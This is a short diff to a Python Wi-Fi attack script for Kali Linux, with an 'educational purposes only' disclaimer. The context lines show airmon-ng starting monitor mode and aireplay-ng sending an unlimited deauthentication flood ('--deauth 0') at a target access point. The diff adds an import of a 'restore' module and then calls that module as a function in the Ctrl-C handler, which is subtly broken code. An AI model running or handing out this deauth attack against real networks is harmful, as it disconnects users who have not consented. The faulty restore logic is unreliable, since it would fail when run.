@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 # Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.
 
+# Import the restore function
+import restore
 # We will be using the subprocess module to run commands on Kali Linux.
 import subprocess
 # We require regular expressions.
@@ -196,5 +198,6 @@ subprocess.run(["airmon-ng", "start", hacknic, hackchannel])
 try:
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
 except KeyboardInterrupt:
+    # User will need to use control-c to break the script.
+    restore()
     print("Done!")
-# User will need to use control-c to break the script.
